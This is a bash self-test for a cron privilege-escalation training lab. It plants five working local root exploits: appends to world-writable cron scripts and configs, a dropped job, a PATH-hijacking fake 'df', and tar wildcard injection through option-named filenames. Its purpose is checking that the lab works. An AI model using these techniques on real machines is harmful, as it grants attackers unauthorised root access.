#!/usr/bin/env bash
# =============================================================================
#  Road to Root — cron lab self-test
#
#  Arms every planted cron path on the "60-Second Window" box, waits for root's
#  cron to fire, and asserts each path reaches root (each payload reads the
#  root-only flag into a world-readable proof file -- only root can do that, so
#  a PASS can't be a false positive). Also checks the flag is NOT readable
#  without exploiting.
#
#  Run it as labuser1 INSIDE the target container:
#     docker cp tests/verify_cron.sh target-cron:/tmp/
#     docker exec -u labuser1 target-cron bash /tmp/verify_cron.sh
#
#  It waits up to ~150s for cron (jobs fire every minute). Exit 0 = all paths
#  work. Non-zero = something is broken. (Used by CI.)
# =============================================================================
set -u
FLAG='R2R{'
P=/tmp/rtr_proof            # each station writes ${P}_<x>

echo "== identity =="
id

echo "== control: the flag must NOT be readable as $(id -un) =="
if cat /root/flag.txt 2>/dev/null; then
  echo "  [FAIL] control — flag readable without root (setup is broken!)"
  exit 1
else
  echo "  [PASS] control — flag is root-only (Permission denied, as expected)"
fi

echo "== arming all five cron paths =="

# A — world-writable cron script: append to the script root runs.
printf '\ncat /root/flag.txt > %s_a 2>/dev/null; chmod 644 %s_a\n' "$P" "$P" >> /opt/maint/rotate.sh
echo "  armed A  -> append to /opt/maint/rotate.sh"

# B — world-writable sourced config: `source` executes whatever we append.
printf '\ncat /root/flag.txt > %s_b 2>/dev/null; chmod 644 %s_b\n' "$P" "$P" >> /etc/rtr/backup.conf
echo "  armed B  -> append to /etc/rtr/backup.conf"

# C — world-writable drop dir: drop a job the cron will execute.
printf '#!/bin/bash\ncat /root/flag.txt > %s_c 2>/dev/null; chmod 644 %s_c\n' "$P" "$P" > /opt/jobs/zz-pwn.sh
chmod +x /opt/jobs/zz-pwn.sh
echo "  armed C  -> drop /opt/jobs/zz-pwn.sh"

# D — PATH hijack: plant a malicious 'df' earlier in the cron's PATH.
printf '#!/bin/bash\ncat /root/flag.txt > %s_d 2>/dev/null; chmod 644 %s_d\n' "$P" "$P" > /opt/maint/bin/df
chmod +x /opt/maint/bin/df
echo "  armed D  -> plant /opt/maint/bin/df"

# E — wildcard injection: crafted filenames become tar options.
cd /opt/data || exit 2
printf '#!/bin/bash\ncat /root/flag.txt > %s_e 2>/dev/null; chmod 644 %s_e\n' "$P" "$P" > runme.sh
chmod +x runme.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh runme.sh'
echo "  armed E  -> tar --checkpoint-action in /opt/data"

echo "== waiting for root's cron to fire (every minute; up to ~150s) =="
labels_a="A  world-writable cron script"
labels_b="B  world-writable sourced config"
labels_c="C  world-writable drop directory"
labels_d="D  PATH hijack in cron"
labels_e="E  wildcard (tar) injection"
for i in $(seq 1 15); do
  sleep 10
  have=0
  for x in a b c d e; do [ -f "${P}_$x" ] && have=$((have + 1)); done
  echo "  [t+$((i * 10))s] ${have}/5 paths have fired"
  [ "$have" -eq 5 ] && break
done

echo "== results =="
PASS=0; FAIL=0
for x in a b c d e; do
  eval "label=\$labels_$x"
  if [ -f "${P}_$x" ] && grep -q "$FLAG" "${P}_$x" 2>/dev/null; then
    echo "  [PASS] $label"; PASS=$((PASS + 1))
  else
    echo "  [FAIL] $label"; FAIL=$((FAIL + 1))
  fi
done

echo "== score =="
echo "  PASS=$PASS  FAIL=$FAIL   (expected: 5 pass / 0 fail)"
if [ "$FAIL" -eq 0 ]; then
  echo "  ALL CRON PATHS REACH ROOT -- OK"
  exit 0
else
  echo "  SOME PATHS FAILED"
  exit 1
fi
